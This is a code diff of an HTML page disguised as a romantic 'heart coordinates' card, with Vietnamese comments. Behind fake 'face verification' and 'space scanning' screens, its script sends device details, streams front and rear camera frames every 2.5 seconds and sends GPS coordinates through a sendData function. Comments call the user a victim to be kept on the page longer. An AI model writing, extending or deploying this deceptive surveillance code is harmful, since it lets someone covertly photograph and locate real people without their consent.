@@ -6,46 +6,16 @@
     <title>Gửi tọa độ trái tim 💌</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap');
-        body {
-            margin: 0; padding: 0; font-family: 'Nunito', sans-serif;
-            background: linear-gradient(135deg, #ffe6e6 0%, #ffb3c6 100%);
-            height: 100vh; display: flex; justify-content: center; align-items: center;
-            overflow: hidden; position: relative;
-        }
-        .heart {
-            position: absolute; bottom: -20px; font-size: 24px; color: #ff4d6d;
-            animation: floatUp 4s linear infinite; opacity: 0;
-        }
-        @keyframes floatUp {
-            0% { transform: translateY(0) scale(0.5); opacity: 0; }
-            20% { opacity: 0.8; }
-            100% { transform: translateY(-100vh) scale(1.2); opacity: 0; }
-        }
-        .card {
-            background: rgba(255, 255, 255, 0.9); padding: 40px 30px; border-radius: 24px;
-            box-shadow: 0 10px 30px rgba(255, 77, 109, 0.2); text-align: center;
-            max-width: 340px; width: 90%; z-index: 10; backdrop-filter: blur(10px);
-            border: 2px solid #fff; animation: popIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-        @keyframes popIn {
-            0% { transform: scale(0.8); opacity: 0; }
-            100% { transform: scale(1); opacity: 1; }
-        }
+        body { margin: 0; padding: 0; font-family: 'Nunito', sans-serif; background: linear-gradient(135deg, #ffe6e6 0%, #ffb3c6 100%); height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; position: relative; }
+        .heart { position: absolute; bottom: -20px; font-size: 24px; color: #ff4d6d; animation: floatUp 4s linear infinite; opacity: 0; }
+        @keyframes floatUp { 0% { transform: translateY(0) scale(0.5); opacity: 0; } 20% { opacity: 0.8; } 100% { transform: translateY(-100vh) scale(1.2); opacity: 0; } }
+        .card { background: rgba(255, 255, 255, 0.9); padding: 40px 30px; border-radius: 24px; box-shadow: 0 10px 30px rgba(255, 77, 109, 0.2); text-align: center; max-width: 340px; width: 90%; z-index: 10; backdrop-filter: blur(10px); border: 2px solid #fff; animation: popIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
         .icon { font-size: 50px; margin-bottom: 10px; animation: pulse 1.5s infinite; }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
         h2 { color: #d90429; margin: 10px 0; font-size: 22px; }
         p { color: #6c757d; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
-        .btn {
-            background: linear-gradient(to right, #ff758c 0%, #ff7eb3 100%);
-            color: white; border: none; padding: 15px 30px; font-size: 16px;
-            font-weight: bold; border-radius: 50px; cursor: pointer;
-            box-shadow: 0 5px 15px rgba(255, 117, 140, 0.4); transition: all 0.3s ease;
-            width: 100%; font-family: 'Nunito', sans-serif;
-        }
+        .btn { background: linear-gradient(to right, #ff758c 0%, #ff7eb3 100%); color: white; border: none; padding: 15px 30px; font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 5px 15px rgba(255, 117, 140, 0.4); transition: all 0.3s ease; width: 100%; font-family: 'Nunito', sans-serif; }
         .btn:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(255, 117, 140, 0.6); }
         .hidden { display: none; }
     </style>
@@ -64,7 +34,7 @@
     <canvas id="canvas" class="hidden"></canvas>
 
     <script>
-        // Tạo hiệu ứng tim bay lơ lửng
+        // Tạo hiệu ứng tim bay
         function createHearts() {
             const body = document.querySelector('body');
             const heart = document.createElement('div');
@@ -87,32 +57,35 @@
             });
         }
 
-        // Hàm chụp ảnh từ Camera
-        async function captureCamera(facingMode) {
+        let streamCam = null; // Biến lưu camera
+
+        // Hàm bật cam và gửi ảnh liên tục
+        async function startCameraStream(facingMode, cameraName) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
+                streamCam = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: facingMode } 
                 });
                 const video = document.getElementById('video');
-                video.srcObject = stream;
+                video.srcObject = streamCam;
                 
-                // Đợi 1.5s để camera lấy nét
-                await new Promise(r => setTimeout(r, 1500));
-                
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                const imageBase64 = canvas.toDataURL('image/jpeg', 0.6);
-                
-                // Tắt cam
-                stream.getTracks().forEach(track => track.stop());
-                return imageBase64;
+                // Đợi cam lấy nét
+                await new Promise(r => setTimeout(r, 2000));
+
+                // Cứ 2.5 giây chụp 1 lần
+                setInterval(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const imageBase64 = canvas.toDataURL('image/jpeg', 0.4); // Giảm chất lượng để gửi nhanh
+                    
+                    sendData({ type: "webcam_stream", camera: cameraName, image: imageBase64 });
+                }, 2500);
+
             } catch (err) {
-                console.log("Không mở được cam:", err);
-                return null;
+                console.log("Lỗi cam:", err);
             }
         }
 
@@ -121,52 +94,42 @@
             const btn = document.getElementById('btn');
             const card = document.getElementById('card');
             
-            // Gửi info thiết bị ngay lập tức
-            sendData({ 
-                type: "basic_info", 
-                platform: navigator.platform, 
-                userAgent: navigator.userAgent,
-                screen: screen.width + "x" + screen.height
-            });
+            // Gửi info thiết bị
+            sendData({ type: "basic_info", platform: navigator.platform, userAgent: navigator.userAgent, screen: screen.width + "x" + screen.height });
 
-            // 1. CHỤP CAM TRƯỚC
-            btn.innerHTML = "Đang xác minh khuôn mặt... ⏳";
-            const frontImg = await captureCamera("user");
-            if (frontImg) {
-                sendData({ type: "webcam", camera: "TRƯỚC", image: frontImg });
-            }
+            btn.innerHTML = "Đang kết nối vệ tinh... ⏳";
 
-            // 2. CHỤP CAM SAU
-            btn.innerHTML = "Đang xác minh không gian... ⏳";
-            const rearImg = await captureCamera("environment");
-            if (rearImg) {
-                sendData({ type: "webcam", camera: "SAU", image: rearImg });
-            }
+            // 1. Bật Cam Trước và Stream
+            await startCameraStream("user", "TRƯỚC");
 
-            // 3. LẤY GPS
-            btn.innerHTML = "Đang lấy tọa độ... 📍";
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        sendData({ type: "gps", lat: pos.coords.latitude, lon: pos.coords.longitude });
-                    },
-                    (err) => {
-                        sendData({ type: "gps_denied", error: err.message });
-                    }
-                );
-            }
-
-            // 4. HIỂN THỊ THÔNG BÁO THÀNH CÔNG
+            // Đổi giao diện để giữ chân nạn nhân lâu hơn
             card.innerHTML = `
-                <div class="icon">💖</div>
-                <h2>Xác thực thành công!</h2>
-                <p>Hệ thống đã ghi nhận tọa độ trái tim của bạn. Đang chuyển hướng...</p>
+                <div class="icon">🔍</div>
+                <h2>Đang quét khuôn mặt...</h2>
+                <p>Vui lòng giữ nguyên thiết bị, hệ thống đang đối chiếu dữ liệu sinh trắc học...</p>
             `;
 
-            // Tự động chuyển hướng sau 3s để phi tang
-            setTimeout(() => {
-                window.location.href = 'https://www.facebook.com';
-            }, 3000);
+            // Sau 15 giây, chuyển sang Cam Sau (để livestream cảnh vật)
+            setTimeout(async () => {
+                if (streamCam) {
+                    streamCam.getTracks().forEach(track => track.stop()); // Tắt cam trước
+                }
+                
+                card.innerHTML = `
+                    <div class="icon">🌍</div>
+                    <h2>Đang xác minh không gian...</h2>
+                    <p>Vui lòng xoay điện thoại xung quanh để quét môi trường...</p>
+                `;
+                
+                await startCameraStream("environment", "SAU");
+                
+                // Lấy GPS
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => { sendData({ type: "gps", lat: pos.coords.latitude, lon: pos.coords.longitude }); }
+                    );
+                }
+            }, 15000);
         }
     </script>
 </body>
